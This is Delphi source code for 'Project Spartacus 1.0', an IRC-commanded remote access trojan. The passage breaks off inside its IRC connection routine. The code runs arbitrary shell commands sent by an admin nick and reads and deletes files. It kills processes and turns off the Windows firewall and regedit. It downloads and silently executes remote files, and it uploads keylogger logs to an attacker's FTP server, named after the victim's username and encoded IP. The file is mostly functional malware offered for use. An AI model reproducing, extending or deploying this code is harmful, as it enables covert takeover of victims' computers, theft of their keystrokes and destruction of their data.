// Project Spartacus 1.0
// (C) Doddy Hackman 2014

program spartacus;

{$APPTYPE GUI}
{$R *.res}
{$POINTERMATH ON}

uses
  System.SysUtils, idIRC, idContext, idGlobal, Windows, Classes, PerlRegex,
  TlHelp32, ShellApi, WinSvc, Registry, URLMon, WinInet, Math;

var
  irc: TIdIRC;
  m1: TMethod;
  m2: TMethod;

var
  irc_host, irc_host_secundario, irc_port, gen_nick, irc_nick, irc_user,
    irc_channel, admin, ftp_host, ftp_user, ftp_pass, ftp_path, timeout,
    nick_definido, keylogger_activo: string;

var
  ventanas_activas: string;
  time_keylogger: integer;

var
  ob: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  todo: string;

var
  directorio, directorio_final, carpeta, nombrereal, yalisto: string;
  registro: HKEY;
  i_use_this, dir, dirs, folder: string;



  // Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure upload_ftpfile(host, username, password, filetoupload,
  conestenombre: Pchar);

// Credits :
// Based on : http://stackoverflow.com/questions/1380309/why-is-my-program-not-uploading-file-on-remote-ftp-server
// Thanks to Omair Iqbal

var
  controluno: HINTERNET;
  controldos: HINTERNET;

begin

  try

    begin
      controluno := InternetOpen(0, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
      controldos := InternetConnect(controluno, host, INTERNET_DEFAULT_FTP_PORT,
        username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
      ftpPutFile(controldos, filetoupload, conestenombre,
        FTP_TRANSFER_TYPE_BINARY, 0);
      InternetCloseHandle(controldos);
      InternetCloseHandle(controluno);
    end
  except
    //
  end;

end;

function dh_generate(cantidad: integer): string;

const
  opciones: array [1 .. 3] of string = ('mayus', 'minus', 'numbers');

var
  aleatorio: integer;
  iz: integer;

var
  finalr: string;
begin

  finalr := '';

  for iz := 1 to cantidad do
  begin
    aleatorio := Random(4 - 1) + 1;

    if (opciones[aleatorio] = 'mayus') then
    begin
      finalr := finalr + Chr(ord('A') + Random(26));
    end;
    if (opciones[aleatorio] = 'minus') then
    begin
      finalr := finalr + Chr(ord('a') + Random(26));
    end;
    if (opciones[aleatorio] = 'numbers') then
    begin
      finalr := finalr + Chr(ord('0') + Random(10));
    end;
  end;

  Result := finalr;

end;

function toma(const pagina: string): UTF8String;

// Credits : Based on http://www.scalabium.com/faq/dct0080.htm
// Thanks to www.scalabium.com

var
  nave1: HINTERNET;
  nave2: HINTERNET;
  tou: DWORD;
  codez: UTF8String;
  codee: array [0 .. 1023] of byte;
  finalfinal: string;

begin

  try

    begin

      finalfinal := '';
      Result := '';

      nave1 := InternetOpen
        ('Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12',
        INTERNET_OPEN_TYPE_PRECONFIG, nil, nil, 0);

      nave2 := InternetOpenUrl(nave1, Pchar(pagina), nil, 0,
        INTERNET_FLAG_RELOAD, 0);

      repeat

      begin
        InternetReadFile(nave2, @codee, SizeOf(codee), tou);
        SetString(codez, PAnsiChar(@codee[0]), tou);
        finalfinal := finalfinal + codez;
      end;

      until tou = 0;

      InternetCloseHandle(nave2);
      InternetCloseHandle(nave1);

      Result := finalfinal;
    end;

  except
    //
  end;

end;

function regex2(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function encode_ip(text: string): string;
begin
  text := StringReplace(text, '0', 'd', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '1', 'o', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '2', 'd', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '3', 'd', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '4', 'y', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '5', 'h', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '6', 'a', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '7', 'c', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '8', 'k', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '9', '0', [rfReplaceAll, rfIgnoreCase]);
  text := StringReplace(text, '.', '-', [rfReplaceAll, rfIgnoreCase]);
  Result := text;
end;

function get_ip(): string;
var
  codigo_de_pagina, consegui_ip: string;
  regex: TPerlRegex;
begin
  codigo_de_pagina := toma('http://whatismyipaddress.com/');
  consegui_ip := regex2(codigo_de_pagina, 'alt="Click for more about ',
    '"></a>');

  regex := TPerlRegex.Create();
  regex.regex := '^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$';
  regex.Subject := consegui_ip;
  if regex.Match then
  begin
    Result := '[+] IP : ' + consegui_ip;
  end;
  regex.Free;

end;

function generate_nick(): string;
var
  codigo_de_pagina, consegui_ip: string;
  regex: TPerlRegex;
  user, numeros: string;
  finalz: string;
begin

  codigo_de_pagina := toma('http://whatismyipaddress.com/');
  consegui_ip := regex2(codigo_de_pagina, 'alt="Click for more about ',
    '"></a>');

  regex := TPerlRegex.Create();
  regex.regex := '^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$';
  regex.Subject := consegui_ip;
  if regex.Match then
  begin
    numeros := encode_ip(consegui_ip);
  end
  else
  begin
    numeros := encode_ip(dh_generate(9));
  end;
  user := GetEnvironmentVariable('username');
  regex.Free;
  finalz := user + '-' + numeros;
  Result := finalz;

end;

function get_logs(): string;
begin
  if (nick_definido = '') then
  begin
    gen_nick := generate_nick();
    upload_ftpfile(Pchar(ftp_host), Pchar(ftp_user), Pchar(ftp_pass),
      Pchar('logs.html'), Pchar('/' + ftp_path + '/' + generate_nick() +
      '.html'));
  end
  else
  begin
    gen_nick := generate_nick();
    upload_ftpfile(Pchar(ftp_host), Pchar(ftp_user), Pchar(ftp_pass),
      Pchar('logs.html'), Pchar('/' + ftp_path + '/' + nick_definido +
      '.html'));
  end;
  Result := '[+] Keylooger Logs : OK';
end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  try

    begin
      AssignFile(ar, filename);
      FileMode := fmOpenWrite;

      if FileExists(filename) then
        Append(ar)
      else
        Rewrite(ar);

      Write(ar, texto);
      CloseFile(ar);
    end;
  except
    //
  end;

end;

procedure responder(user, texto: string);
var
  listando: TStringList;
  text: string;
begin

  listando := TStringList.Create;
  listando.text := texto;

  irc.Say(user, '[+] Working ...');
  sleep(StrToInt(timeout) * 1000);
  for text in listando do
  begin
    irc.Say(user, text);
    sleep(StrToInt(timeout) * 1000);
  end;

  irc.Say(user, '[+] Finished');

end;

// Functions server

function leerarchivo(rutadelarchivo: string): string;
const
  cantidad_buffer = $8000;

var
  fun_uno: LongWord;
  fun_dos: THandle;
  fun_tres: array [0 .. cantidad_buffer - 1] of AnsiChar;

begin

  fun_tres := '';

  fun_dos := CreateFile(Pchar(rutadelarchivo), GENERIC_READ, FILE_SHARE_READ or
    FILE_SHARE_WRITE, nil, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, 0);

  SetFilePointer(fun_dos, 0, nil, FILE_BEGIN);

  ReadFile(fun_dos, fun_tres, cantidad_buffer, fun_uno, nil);

  while (fun_uno > 0) do
  begin
    ReadFile(fun_dos, fun_tres, cantidad_buffer, fun_uno, nil);
  end;

  CloseHandle(fun_dos);

  Result := fun_tres;

end;

function crazy_mouse(number: string): string;
var
  i: integer;
  code: string;
begin
  code := '';
  For i := 1 to StrToInt(number) do
  begin
    sleep(1000);
    SetCursorPos(i, i);
  end;
  code := '[?] Crazy Mouse : OK';
  Result := code;
end;

function SendKeys(texto: string): string;
// Thanks to Remy Lebeau for the help
var
  eventos: PInput;
  controlb, controla: integer;
  code: string;
begin

  code := '';
  code := '[?] SendKeys : OK';

  GetMem(eventos, SizeOf(TInput) * (Length(texto) * 2));

  controla := 0;

  for controlb := 1 to Length(texto) do
  begin

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

    eventos[controla].Itype := INPUT_KEYBOARD;
    eventos[controla].ki.wVk := 0;
    eventos[controla].ki.wScan := ord(texto[controlb]);
    eventos[controla].ki.dwFlags := KEYEVENTF_UNICODE or KEYEVENTF_KEYUP;
    eventos[controla].ki.time := 0;
    eventos[controla].ki.dwExtraInfo := 0;

    Inc(controla);

  end;

  SendInput(controla, eventos[0], SizeOf(TInput));

  Result := code;

end;

function escribir_word(texto: string): string;
var
  code: string;
begin
  code := '';
  code := '[?] Word Joke : OK';
  ShellExecute(0, nil, Pchar('winword.exe'), nil, nil, SW_SHOWNORMAL);
  sleep(5000);
  SendKeys(texto);
  Result := code;

end;

function cambiar_barra(opcion: string): string;
var
  code: string;
begin
  code := '';

  if (opcion = 'hide') then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
    code := '[?] Hidden Taskbar : OK';
  end
  else
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
    code := '[?] Show Taskbar : OK';
  end;

  Result := code;

end;

function cambiar_iconos(opcion: string): string;
var
  code: string;
  acatoy: THandle;
begin
  code := '';
  acatoy := FindWindow('ProgMan', nil);
  acatoy := GetWindow(acatoy, GW_CHILD);
  if (opcion = 'hide') then
  begin
    ShowWindow(acatoy, SW_HIDE);
    code := '[?] Hidden Icons : OK';
  end
  else
  begin
    ShowWindow(acatoy, SW_SHOW);
    code := '[?] Show Icons : OK';
  end;
  Result := code;
end;

function listardirectorio(dir: string): string;
var

  busqueda: TSearchRec;
  code: string;

begin

  code := '';

  FindFirst(dir + '\*.*', faAnyFile + faDirectory + faReadOnly, busqueda);

  code := code + '[?] : ' + busqueda.Name + sLineBreak;

  while FindNext(busqueda) = 0 do
  begin
    code := code + '[?] : ' + busqueda.Name + sLineBreak;
  end;

  Result := code;

end;

function borraresto(archivo: string): string;
var
  code: string;
begin

  code := '';

  if DirectoryExists(archivo) then
  begin
    if (RemoveDir(archivo)) then
    begin
      code := '[?] Directory removed';
    end
    else
    begin
      code := '[?] Error';
    end;
  end;
  if FileExists(archivo) then
  begin
    if (DeleteFile(Pchar(archivo))) then
    begin
      code := '[?] File removed';
    end
    else
    begin
      code := '[?] Error';
    end;
  end;

  Result := code;

end;

function matarproceso(pid: string): string;
var
  vano: THandle;
  code: string;

begin

  code := '';
  vano := OpenProcess(PROCESS_TERMINATE, FALSE, StrToInt(pid));

  if TerminateProcess(vano, 0) then
  begin
    code := '[?] Kill Process : OK';
  end
  else
  begin
    code := '[?] Kill Process : ERROR';
  end;

  Result := code;

end;

function listarprocesos(): string;
var
  conector: THandle;
  timbre: LongBool;
  indicio: TProcessEntry32;
  code: string;

begin

  code := '';

  conector := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  indicio.dwSize := SizeOf(indicio);

  timbre := Process32First(conector, indicio);

  while timbre do

  begin

    code := code + '[?] Name : ' + indicio.szExeFile + ' [?] PID : ' +
      IntToStr(indicio.th32ProcessID) + sLineBreak;

    timbre := Process32Next(conector, indicio);

  end;

  Result := code;

end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, Pchar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    Pchar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

  Result := code;

end;

function leerdatos_sub(sub_1, sub_2, sub_3, sub_4: integer): DWORD;
begin
  Result := sub_1 shl 16 or sub_4 shl 14 or sub_2 shl 2 or sub_3;
end;

function opencd(tipoh: string): string;

// Credits : Based on http://stackoverflow.com/questions/19894566/using-windows-and-mmsystem-in-delphi
// Thanks to Sertac Akyuz

const
  const_uno = $00000009;
  const_dos = $0000002D;
  const_tres = 0;
  const_cuatro = 0;
  const_cinco = $0001;
  const_seis = const_dos;
  const_siete = 6;
  const_ocho = 8;

var
  var_uno: string;
  var_dos: THandle;
  var_tres: DWORD;
  opciondecd: integer;

begin

  if (tipoh = 'open') then
  begin
    opciondecd := $0202;
  end;

  if (tipoh = 'close') then
  begin
    opciondecd := $0203;
  end;

  var_uno := Format('\\.\%s:', ['D']);
  var_dos := CreateFile(Pchar(var_uno), GENERIC_READ, FILE_SHARE_WRITE, nil,
    OPEN_EXISTING, 0, 0);
  DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_siete, const_tres,
    const_cuatro), nil, 0, nil, 0, var_tres, nil);
  DeviceIoControl(var_dos, leerdatos_sub(const_uno, const_ocho, const_tres,
    const_cuatro), nil, 0, nil, 0, var_tres, nil);
  DeviceIoControl(var_dos, leerdatos_sub(const_seis, opciondecd, const_tres,
    const_cinco), nil, 0, nil, 0, var_tres, nil);
  CloseHandle(var_dos);

  Result := '[?] CD : OK';

end;

function usb_name(checked: Char): string;
// Based on http://delphitutorial.info/get-volume-name.html
var
  uno, dos: DWORD;
  resultnow: array [0 .. MAX_PATH] of Char;
begin
  try
    GetVolumeInformation(Pchar(checked + ':/'), resultnow, SizeOf(resultnow),
      nil, uno, dos, nil, 0);
    Result := StrPas(resultnow);
  except
    Result := checked;
  end;
end;

function check_drive(target: string): Boolean;
var
  a, b, c: Cardinal;
begin
  Result := GetVolumeInformation(Pchar(target), nil, 0, @c, a, b, nil, 0);
end;

function get_drives(): string;
var
  unidad: Char;
  code: string;
begin
  code := code + '[+] List Drives : OK' + sLineBreak;
  for unidad := 'C' to 'Z' do
  begin
    if (check_drive(Pchar(unidad + ':\')) = True) then
    begin
      if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        code := code + '[+] USB Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_FIXED) then
      begin
        code := code + '[+] Fixed Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOTE) then
      begin
        code := code + '[+] Remote Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_CDROM) then
      begin
        code := code + '[+] CD Rom Drive : ' + unidad + sLineBreak;
      end;
      if (GetDriveType(Pchar(unidad + ':\')) = DRIVE_RAMDISK) then
      begin
        code := code + '[+] RAM Drive : ' + unidad + sLineBreak;
      end;
    end;
  end;
  Result := code;
end;

function get_services(): string;

// Based on : http://www.delphitricks.com/source-code/systeminfo/get_a_list_of_installed_services.html
// Thanks to Alexander Savchev

type
  typeuno = array [0 .. 4096] of TEnumServiceStatus;
  typedos = ^typeuno;

var
  i: integer;

  uno: SC_Handle;
  dos, tres, cuatro: DWORD;
  cinco: typedos;
  code: string;

begin

  code := '[+] List services : OK' + sLineBreak;

  uno := OpenSCManager(Pchar(''), nil, SC_MANAGER_ALL_ACCESS);

  if (uno > 0) then
  begin

    cuatro := 0;

    New(cinco);

    EnumServicesStatus(uno, SERVICE_WIN32, SERVICE_STATE_ALL, cinco^[0],
      SizeOf(cinco^), dos, tres, cuatro);

    code := code + '[+] Services Found : ' + IntToStr(tres) + sLineBreak;

    for i := 0 to tres - 1 do
    begin
      code := code + '[+] Service : ' + StrPas(cinco^[i].lpDisplayName) +
        sLineBreak;
    end;

    Result := code;

    Dispose(cinco);

    CloseServiceHandle(uno);
  end;
end;

function get_windows(var1: HWND; var2: integer): Boolean; stdcall;
var
  uno: DWORD;
  titulo, dos: string;
begin

  GetWindowThreadProcessId(var1, uno);

  SetLength(titulo, 255);
  SetLength(titulo, GetWindowText(var1, Pchar(titulo), Length(titulo)));
  if not(titulo = '') then
  begin
    ventanas_activas := ventanas_activas + titulo + sLineBreak;
  end;
  Result := True;

end;

function desactivar_firewall(os, opcion: string): string;
begin
  if (os = 'xp') then
  begin
    if (opcion = 'on') then
    begin
      ejecutar('netsh firewall set opmode enable');
    end;
    if (opcion = 'off') then
    begin
      ejecutar('netsh firewall set opmode disable');
    end;
  end;
  if (os = 'seven') then
  begin
    if (opcion = 'on') then
    begin
      ejecutar('netsh advfirewall set currentprofile state on');
    end;
    if (opcion = 'off') then
    begin
      ejecutar('netsh advfirewall set currentprofile state off');
    end;
  end;
  Result := '[+] Firewall Changed : OK';
end;

function apagar(): string;
begin
  ejecutar('shutdown -p');
  Result := '[+] Shutdown : OK';
end;

function cerrar_sesion(): string;
begin
  ejecutar('shutdown -l');
  Result := '[+] Close Session : OK';
end;

function reiniciar(): string;
begin
  ejecutar('shutdown -r');
  Result := '[+] Reboot : OK';
end;

function mensaje_box(texto: string): string;
begin
  ejecutar('msg * ' + texto);
  Result := '[+] Message : OK';
end;

function cargar_pagina(pagina: string): string;
begin
  ejecutar('start ' + pagina);
  Result := '[+] Load Page : OK';
end;

function cargar_paint(): string;
begin
  ejecutar('mspaint.exe');
  Result := '[+] Paint Loaded : OK';
end;

function regedit(opcion: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if (opcion = 'show') then
  begin
    make.WriteInteger('DisableRegistryTools', 0);
  end;
  if (opcion = 'hide') then
  begin
    make.WriteInteger('DisableRegistryTools', 1);
  end;
  make.Free;
  Result := '[+] Regedit Changed : OK';
end;

function edit_text_taskbar(opcion, texto: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Control Panel\International', True);
  if (opcion = 'enable') then
  begin
    make.WriteString('sShortTime', 'tt');
    make.WriteString('sTimeFormat', 'tt');
    make.WriteString('s1159', texto);
    make.WriteString('s2359', texto);
  end;
  if (opcion = 'disable') then
  begin
    make.WriteString('sShortTime', 'H:mm');
    make.WriteString('sTimeFormat', 'H:mm:ss');
    make.WriteString('s1159', '');
    make.WriteString('s2359', '');
  end;
  make.Free;
  Result := '[+] Taskbar Text : OK';
end;

procedure cargar_archivo(archivo: TFileName; tipo: string);
var
  Data: SHELLEXECUTEINFO;
begin
  if (FileExists(archivo)) then
  begin
    ZeroMemory(@Data, SizeOf(SHELLEXECUTEINFO));
    Data.cbSize := SizeOf(SHELLEXECUTEINFO);
    Data.fMask := SEE_MASK_NOCLOSEPROCESS;
    Data.Wnd := 0;
    Data.lpVerb := 'open';
    Data.lpFile := Pchar(archivo);
    if (tipo = 'Show') then
    begin
      Data.nShow := SW_SHOWNORMAL;
    end;
    if (tipo = 'Hide') then
    begin
      Data.nShow := SW_HIDE;
    end;
    if not ShellExecuteEx(@Data) then
      if GetLastError <= 32 then
      begin
        SysErrorMessage(GetLastError);
      end;
  end;
end;

function download_and_execute(link, new_name: string): string;
begin

  {
    Delete(link, 1, 1);
    link := StringReplace(link, '12', '', [rfReplaceAll, rfIgnoreCase]);
    link := StringReplace(link, '▼', '', [rfReplaceAll, rfIgnoreCase]);
    link := StringReplace(link, '▼♥', '', [rfReplaceAll, rfIgnoreCase]);
    link := StringReplace(link, '', '', [rfReplaceAll, rfIgnoreCase]);
  }

  UrlDownloadToFile(nil, Pchar(link), Pchar(new_name), 0, nil);
  if (FileExists(new_name)) then
  begin
    SetFileAttributes(Pchar(new_name), FILE_ATTRIBUTE_HIDDEN);
    cargar_archivo(Pchar(new_name), 'Hide');
  end;
  Result := '[+] Download & Execute : OK';
end;

//

procedure IrcPrivateMessage(ASelf: Pointer; Sender: TIdContext;
  const ANickname, AHost, ATarget, AMessage: string);
var
  nick, mensaje: string;
  regex: TPerlRegex;
  help, about: string;
begin

  nick := ANickname;
  mensaje := AMessage;

  if (nick = admin) then
  begin

    // Writeln('[+] Message ' + nick + ' > ' + mensaje);

    regex := TPerlRegex.Create();
    regex.regex := '!cmd (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, ejecutar(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_process';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, listarprocesos());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!kill_process (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, matarproceso(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!list_dir (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, listardirectorio(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!delete (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, borraresto(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!open_file (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, leerarchivo(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!open_cd';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, opencd('open'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!close_cd';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, opencd('close'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!hide_icons';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cambiar_iconos('hide'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!show_icons';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cambiar_iconos('mostrar'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!hide_taskbar';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cambiar_barra('hide'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!show_taskbar';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cambiar_barra('mostrar'));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!sendkeys (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, SendKeys(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!openword (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, escribir_word(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_drives';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, get_drives());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_services';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, get_services());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_windows';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      ventanas_activas := '';
      EnumWindows(@get_windows, 9999);
      responder(nick, ventanas_activas);
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!firewall (.*) (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, desactivar_firewall(regex.Groups[1], regex.Groups[2]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!shutdown';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, apagar());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!close_session';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cerrar_sesion());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!reboot';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, reiniciar());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!message (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, mensaje_box(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!load_page (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cargar_pagina(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!load_paint';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, cargar_paint());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!regedit (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, regedit(regex.Groups[1]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!edit_taskbar_text (.*) (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, edit_text_taskbar(regex.Groups[1], regex.Groups[2]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!download (.*) (.*)';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, download_and_execute(regex.Groups[1], regex.Groups[2]));
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_keylogger_logs';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, get_logs());
    end;
    regex.Free;

    regex := TPerlRegex.Create();
    regex.regex := '!get_ip';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, get_ip);
    end;
    regex.Free;

    help := '[+] Commands : ' + sLineBreak + '!cmd <command> : Execute Command'
      + sLineBreak + '!get_process : List Process' + sLineBreak +
      '!kill_process : Get Process' + sLineBreak +
      '!list_dir <directory : List Files ' + sLineBreak +
      '!delete <file> : Delete Files' + sLineBreak +
      '!open_file <file> : Read File' + sLineBreak + '!open_cd : Open CD' +
      sLineBreak + '!close_cd : Close CD' + sLineBreak +
      '!hide_icons : Hide icons' + sLineBreak + '!show_icons : Show Icons' +
      sLineBreak + '!hide_taskbar : Hide Taskbar' + sLineBreak +
      '!show_taskbar : Show Taskbar' + sLineBreak +
      '!sendkeys <text> : Write in the computer' + sLineBreak +
      '!openword <text> : Open word & Write Text' + sLineBreak +
      '!crazymouse <count> : Move mouse' + sLineBreak +
      '!get_drives : List Drives' + sLineBreak + '!get_services : List Services'
      + sLineBreak + '!get_windows : List Windows' + sLineBreak +
      '!firewall <xp/seven> <on/off> : Configure Firewall' + sLineBreak +
      '!shutdown : Shutdown computer' + sLineBreak +
      '!close_session : Close session' + sLineBreak +
      '!reboot : Reboot computer' + sLineBreak +
      '!message <text> : Show Message' + sLineBreak +
      '!load_page <page> : Load page' + sLineBreak + '!load_paint : Load Paint'
      + sLineBreak + '!regedit <show/hide> : Enabled & Disable Regedit' +
      sLineBreak +
      '!edit_taskbar_text <enable/disable> <text> : Edit taskbar text' +
      sLineBreak + '!download <link> <new name> : Download & Execute Files' +
      sLineBreak + '!get_ip : Get IP' + sLineBreak +
      '!get_keylogger_logs : Upload Keyloggers Logs to FTP';

    regex := TPerlRegex.Create();
    regex.regex := '!help';
    regex.Subject := mensaje;
    if regex.Match then
    begin
      responder(nick, help);
    end;
    regex.Free;

  end;
end;

procedure IrcRaw(ASelf: Pointer; ASender: TIdContext; AIn: Boolean;
  const AMessage: String);
begin
  // Writeln(AMessage);
end;

procedure start_irc;
begin
  try

    // Writeln('cargando server principal');

    irc := TIdIRC.Create(nil);
    irc.host := irc_host;
    irc.Port := StrToInt(irc_port);
    irc.Nickname := irc_nick;
    irc.username := irc_user;

    m1.code := @IrcRaw;
    m1.Data := irc;
    irc.OnRaw := TIdIRCRawEvent(m1);

    m2.code := @IrcPrivateMessage;
    m2.Data := irc;
    irc.OnPrivateMessage := TIdIRCPrivMessageEvent(m2);

    try
      irc.Connect;
    except

      // Writeln('cargando server secundario');

      irc.host := irc_host_secundario;
      irc.Port := StrToInt(irc_port);
      irc.Nickname := irc_nick;
      irc.username := irc_user;

      m1.code := @IrcRaw;
      m1.Data := irc;
      irc.OnRaw := TIdIRCRawEvent(m1);

